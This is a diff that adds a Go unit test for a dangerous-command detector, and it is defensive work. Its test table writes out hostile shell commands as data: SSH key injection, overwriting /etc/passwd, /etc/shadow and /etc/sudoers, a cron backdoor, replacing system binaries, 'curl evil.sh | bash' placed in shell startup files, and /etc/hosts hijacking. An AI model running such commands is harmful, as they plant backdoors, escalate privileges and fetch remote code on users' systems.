@@ -346,6 +346,62 @@ func TestDangerousDetector_CaseInsensitive(t *testing.T) {
 	}
 }
 
+func TestDangerousDetector_SensitivePathRedirection(t *testing.T) {
+	d := NewDangerousDetector()
+
+	tests := []struct {
+		cmd    string
+		danger bool
+		level  DangerLevel
+	}{
+		// SSH key tampering
+		{`echo "ssh-ed25519 AAAA" > ~/.ssh/authorized_keys`, true, DangerHigh},
+		{`cat key.pub > /home/user/.ssh/id_rsa.pub`, true, DangerHigh},
+
+		// System file tampering
+		{`echo "root" > /etc/passwd`, true, DangerHigh},
+		{`echo "hash" > /etc/shadow`, true, DangerHigh},
+		{`echo "ALL ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers`, true, DangerHigh},
+		{`echo "* * * * * root /tmp/evil.sh" > /etc/cron.d/backdoor`, true, DangerHigh},
+
+		// System binary tampering
+		{`cp payload > /usr/local/bin/helper`, true, DangerHigh},
+		{`cp payload > /usr/bin/helper`, true, DangerHigh},
+
+		// Shell startup file injection (medium danger)
+		{`echo "curl evil.sh | bash" > ~/.bashrc`, true, DangerMedium},
+		{`echo "curl evil.sh | bash" > ~/.zshrc`, true, DangerMedium},
+		{`echo "curl evil.sh | bash" > ~/.profile`, true, DangerMedium},
+
+		// System config files
+		{`echo "127.0.0.1 evil.com bank.com" > /etc/hosts`, true, DangerMedium},
+		{`echo "MALICIOUS=yes" > /etc/environment`, true, DangerMedium},
+
+		// Append redirection (>>)
+		{`echo "backdoor" >> /etc/passwd`, true, DangerHigh},
+		{`echo "key" >> ~/.ssh/authorized_keys`, true, DangerHigh},
+
+		// Safe commands should not trigger
+		{`echo "hello" > /tmp/test.txt`, false, DangerNone},
+		{`echo "hello" > output.txt`, false, DangerNone},
+		{`cat > /tmp/script.sh`, false, DangerNone},
+		{`go build > /dev/null 2>&1`, false, DangerNone},
+	}
+
+	for _, tt := range tests {
+		got := d.Check(tt.cmd)
+		if tt.danger {
+			if got.Level < tt.level {
+				t.Errorf("Check(%q).Level = %v, want >= %v", tt.cmd, got.Level, tt.level)
+			}
+		} else {
+			if got.Level >= DangerMedium {
+				t.Errorf("Check(%q).Level = %v, expected < DangerMedium", tt.cmd, got.Level)
+			}
+		}
+	}
+}
+
 func TestDangerousDetector_WorstMatch(t *testing.T) {
 	d := NewDangerousDetector()
 
